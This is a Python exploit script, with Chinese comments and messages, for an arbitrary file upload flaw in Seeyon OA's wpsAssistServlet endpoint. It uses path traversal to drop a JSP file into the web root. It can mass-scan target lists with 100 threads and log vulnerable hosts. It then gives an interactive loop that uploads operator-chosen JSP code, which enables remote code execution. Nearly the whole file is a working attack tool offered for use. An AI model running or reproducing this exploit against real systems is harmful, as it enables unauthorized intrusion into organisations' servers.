# 致远OA wpsAssistServlet 任意文件上传漏洞
# 查看回显文件
# http://x.x.x.x/pajgatzw.jsp
import requests,argparse,sys,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    pass

def main():
    # banner()
    #处理命令行输入的参数
    parser = argparse.ArgumentParser(description="致远OA wpsAssistServlet 任意文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input file')
    #处理参数
    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for line in f.readlines():
                url_list.append(line.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = '/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/pajgatzw.jsp&fileId=2'
    url = target+payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=oklp586ac9dujytddee11e86fa698nmv"
    }
    data = '"\r\n\r\n--oklp586ac9dujytddee11e86fa698nmv\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"majgatzw.xls\"\r\nContent-Type: application/vnd.ms-excel\r\n\r\n<% out.println(\"lnrrovkexhsxbzjwptmthmyjgnvgjhjk\");%>  \r\n--oklp586ac9dujytddee11e86fa698nmv--"'
    proxies = {
        'http': 'http://127.0.0.1:7890',
        'https': 'http://127.0.0.1:7890'
    }
    try:
        response = requests.post(url=url, headers=headers, data=data, proxies=proxies, verify=False,timeout=10)
        result = target+'/pajgatzw.jsp'
        if response.status_code == 200 and 'true' in response.text:
            print(f"[+]该网址存在任意文件上传漏洞{target} \n 访问：{result}")
            with open('result.txt', 'a') as f:
                f.write(target + '\n')
                return True
        else:
            print(f"[-]该网址不存在任意文件上传漏洞{target}")
            return False
    except requests.RequestException as e:
        print(f"[*]该网址存在问题，请手动检测{target}")

def exp(target):
    print("--------------正在进行漏洞利用--------------")
    while True:
        file = input('请输入你要上传的文件名,q退出>')
        code = input('请输入文件的内容：')
        if file == 'q' or code == 'q':
            print("正在退出，请等候....")
            exit()
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Content-Type": "multipart/form-data; boundary=oklp586ac9dujytddee11e86fa698nmv"
        }
        payload = '/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/pajgatzw.jsp&fileId=2'
        url = target+payload
        data = f'"\r\n\r\n--oklp586ac9dujytddee11e86fa698nmv\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"{file}\"\r\nContent-Type: application/vnd.ms-excel\r\n\r\n<% out.println(\"{code}\");%>  \r\n--oklp586ac9dujytddee11e86fa698nmv--"'      

        res = requests.post(url=url, headers=headers, data=data,verify=False,timeout=10)
        result1 = target+'/pajgatzw.jsp'
        if res.status_code == 200 and 'true' in res.text:
            print(f"上传成功！请访问：{result1}")
            
        else:
            print("不存在！")
            

if __name__ =='__main__':
    main()